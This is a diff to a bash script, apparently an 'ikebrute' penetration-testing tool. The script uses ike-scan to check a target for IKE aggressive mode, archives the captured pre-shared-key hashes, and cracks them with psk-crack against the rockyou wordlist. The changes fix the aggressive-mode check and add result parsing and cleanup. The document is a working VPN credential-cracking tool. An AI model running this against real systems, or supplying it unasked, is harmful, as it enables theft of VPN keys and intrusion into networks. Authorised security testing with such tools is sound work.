@@ -19,7 +19,7 @@ exit 0
 fi
 # Checks to verify aggressive mode is enabled
 echo "[*]  Checking if Aggressive mode is enabled"
-aggressive=$(ike-scan -M $1 --id=test -P -A | grep "Ending")
+aggressive=$(ike-scan -M $1 --id=test -P -A | grep "Aggressive")
 if [ -z "$aggressive" ]; then
 	clear
 	echo "Aggressive Mode is not enabled"
@@ -36,8 +36,6 @@ clear
 echo "[*]  Compressing the hashes to an archive"
 basefile=$(echo $1 | tr -d ".")
 tar -czvf $basefile.tar.gz /opt/ikebrute/*.hash
-#echo "[*]  Performing cleanup"
-#rm -rf /opt/ikebrute/*.hash
 #Cracking hashes
 clear
 echo "[*]  Cracking hashes"
@@ -45,5 +43,11 @@ for x in $(ls | grep hash); do
 	echo Testing: $x
 	psk-crack $x --dictionary=/usr/share/wordlists/rockyou.txt | tee -a pskcrack.out
 done
+# Parsing results
+cat pskcrack.out | grep -v "Running" | grep -v "Ending" | grep -v "Starting" | tee -a ikebrute-results.txt
+echo "[*]  Performing cleanup"
+rm -rf /opt/ikebrute/*.hash
+rm -rf pskcrack.out
+#Complete
 echo "[*]  Complete"
 exit 0
